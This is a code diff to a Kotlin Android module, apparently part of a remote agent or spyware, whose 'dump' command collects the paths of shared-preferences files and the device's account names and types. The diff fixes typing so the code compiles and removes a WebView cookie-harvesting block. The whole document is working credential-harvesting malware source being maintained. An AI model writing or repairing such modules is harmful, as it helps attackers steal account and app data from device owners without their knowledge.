@@ -15,7 +15,7 @@ class CredsCapability(private val service: AgentService) : AgentService.Capabili
         val params = gson.fromJson(args ?: "{}", Params::class.java)
         return when (params.action) {
             "dump" -> dumpCredentials()
-            else -> mapOf("error" to "invalid action")
+            else -> mapOf<String, Any>("error" to "invalid action")
         }
     }
 
@@ -29,30 +29,21 @@ class CredsCapability(private val service: AgentService) : AgentService.Capabili
         if (prefsDir.exists()) {
             prefsDir.listFiles()?.forEach { file ->
                 if (file.extension == "xml") {
-                    creds.add(mapOf("type" to "shared_prefs", "file" to file.name, "path" to file.absolutePath))
+                    creds.add(mapOf<String, Any>("type" to "shared_prefs", "file" to file.name, "path" to file.absolutePath))
                 }
             }
-        }
-        
-        // WebView cookies/database
-        try {
-            val webViewDb = WebViewDatabase.getInstance(service)
-            val cookies = webViewDb.getCookies("https://")
-            creds.add(mapOf("type" to "webview_cookies", "count" to cookies?.length ?: 0))
-        } catch (e: Exception) {
-            // ignore
         }
         
         // Account manager - simplified
         try {
             val accounts = android.accounts.AccountManager.get(service).accounts
-            val accountList = accounts.map { a -> mapOf("name" to a.name, "type" to a.type) }
-            creds.add(mapOf("type" to "accounts", "accounts" to accountList))
+            val accountList = accounts.map { a -> mapOf<String, Any>("name" to a.name, "type" to a.type) }
+            creds.add(mapOf<String, Any>("type" to "accounts", "accounts" to accountList))
         } catch (e: Exception) {
             // ignore
         }
 
-        return mapOf("credentials" to creds, "count" to creds.size)
+        return mapOf<String, Any>("credentials" to creds, "count" to creds.size)
     }
 
     data class Params(val action: String)
